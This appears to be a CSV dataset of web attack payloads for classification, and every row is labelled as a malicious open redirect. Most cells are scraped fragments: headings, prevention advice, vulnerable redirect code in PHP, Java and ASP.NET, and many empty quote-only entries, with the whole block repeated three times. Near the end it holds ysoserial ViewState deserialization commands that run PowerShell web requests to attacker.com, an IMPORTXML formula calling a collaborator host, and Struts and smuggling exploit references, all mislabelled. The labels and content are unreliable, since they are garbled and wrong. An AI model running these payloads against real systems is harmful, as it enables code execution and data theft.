Payload,Signature,AttackType,Severity,MITRE,Label,Description
redirect_to params[:url],Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Dangerous URL Redirect Example 2,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ASP .NET MVC 1 & 2 websites are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"The code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
ASP.NET MVC 2 LogOn action in,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Preventing Unvalidated Redirects and Forwards,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
Safe use of redirects and forwards can be done in a number of ways:,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Simply avoid using redirects and forwards.,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Sanitize input by creating a list of trusted URL's (lists of hosts or a regex).,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Force all redirects to first go through a page notifying users that they are going off of your site, and have them click a link to confirm.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Open Redirect Payload List :,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
The user sees the link directing to the original trusted site (",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
example.com,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ASP.NET MVC 2 LogOn action in """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
AccountController.cs,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
"response.sendRedirect(""http://www.mysite.com"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
<?php,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
/* Redirect browser */,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"header(""Location: http://www.mysite.com"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
?>,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"Response.Redirect(""~/folder/Login.aspx"")",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect_to login_path,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"response.sendRedirect(request.getParameter(""url""));",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
$redirect_url = $_GET['url'];,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"header(""Location: "" . $redirect_url);",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"string url = request.QueryString[""url""];",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
Response.Redirect(url);,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect_to params[:url],Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Dangerous URL Redirect Example 2,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ASP .NET MVC 1 & 2 websites are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"The code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
ASP.NET MVC 2 LogOn action in,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Preventing Unvalidated Redirects and Forwards,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
Safe use of redirects and forwards can be done in a number of ways:,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Simply avoid using redirects and forwards.,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Sanitize input by creating a list of trusted URL's (lists of hosts or a regex).,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Force all redirects to first go through a page notifying users that they are going off of your site, and have them click a link to confirm.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Open Redirect Payload List :,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
The user sees the link directing to the original trusted site (",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
example.com,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ASP.NET MVC 2 LogOn action in """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
AccountController.cs,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
"response.sendRedirect(""http://www.mysite.com"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
<?php,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
/* Redirect browser */,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"header(""Location: http://www.mysite.com"");",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
?>,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"Response.Redirect(""~/folder/Login.aspx"")",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect_to login_path,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"response.sendRedirect(request.getParameter(""url""));",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
$redirect_url = $_GET['url'];,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"header(""Location: "" . $redirect_url);",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"string url = request.QueryString[""url""];",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
Response.Redirect(url);,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
redirect_to params[:url],Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Dangerous URL Redirect Example 2,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ASP .NET MVC 1 & 2 websites are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"The code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
ASP.NET MVC 2 LogOn action in,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Preventing Unvalidated Redirects and Forwards,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
Safe use of redirects and forwards can be done in a number of ways:,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Simply avoid using redirects and forwards.,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Sanitize input by creating a list of trusted URL's (lists of hosts or a regex).,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Force all redirects to first go through a page notifying users that they are going off of your site, and have them click a link to confirm.",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
#### Open Redirect Payload List :,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
The user sees the link directing to the original trusted site (",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
example.com,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ASP.NET MVC 2 LogOn action in """,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
AccountController.cs,Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Low,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from comprehensive dataset
"ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c ""powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
".\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ""powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName"" --generator=CA0B0334 --validationalg=""SHA1"" --validationkey=""C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
".\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c ""powershell.exe -c nslookup http://attacker.com"" --generator=3E92B2D6 --validationalg=""SHA1"" --validationkey=""C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    * ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
* Then generate a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    # --generator = """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# https://github.com/mpgn/CVE-2019-19781,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
POST https://example.com/reset.php HTTP/1.1,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
git clone https://github.com/defparam/smuggler.git,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
GET http://something.burpcollaborator.net  HTTP/1.1,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
GET http://something.burpcollaborator.net  HTTP/1.1,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"* Victim account: """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"1. Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
[author/tool](https://github.com/URL) - Description,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    if host.find(""https://"") != -1 or host.find(""http://"") != -1:",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"                url = str(""http://"") + str(url)",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"docker run --rm -it -v ""$PWD:/pwd"" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
curl https://api.telegram.org/bot<TOKEN>/getMe,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
-   repo: https://github.com/pre-commit/pre-commit-hooks,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    ",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"    """,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# https://github.com/jas502n/St2-057,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)'",",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    # url: http://example.com/demo/struts2-showcase/index.action,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
        url = str(""""http://"""") + str(url)""",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
    # Site: http://example.com,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
"=IMPORTXML(""http://burp.collaborator.net/csv"", ""//a/@href"")",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
",Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
# SRC: https://raw.githubusercontent.com/bl4de/security-tools/master/jgc.py,Open Redirect,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from comprehensive dataset
